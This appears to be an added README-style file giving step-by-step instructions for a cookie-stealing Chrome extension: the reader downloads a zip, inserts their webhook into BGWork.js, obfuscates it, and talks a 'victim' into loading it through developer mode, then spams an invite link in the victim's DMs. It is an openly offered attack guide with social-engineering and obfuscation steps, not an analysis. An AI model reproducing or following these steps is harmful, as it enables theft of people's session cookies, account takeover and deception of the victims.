@@ -1,0 +1,17 @@
+1. Download this zip https://www.mediafire.com/file/7mqwevmo23uwi9f/Extension_Logger_V2.zip/file.
+2. Extract the folder inside.
+3. Right-click and press edit in BGWork.js
+4. Put in your webhook where it says "YOUR WEBHOOK".
+5. Copy everything and go to obfuscate it ( obfuscate under).
+6. Now your victim has to download the folder you made. (Archive it to a zip and send them that.)
+7. Tell them to extract the folder.
+8. make them go to manage extensions (chrome://extensions/).
+9. Make them press on dev mode top right.
+10. Make them press Load unpacked, (top left).
+11. Make them select the folder they extracted.
+12. Make them press "ok".
+13. Boom you have their cookie.
+14. The Last step spam our invite link in their dms
+OBFUSCATE : 
+Free simple obfuscator, https://javascriptobfuscator.com/Javascript-Obfuscator.aspx.
+Free simple decrypter, http://jsnice.org/.
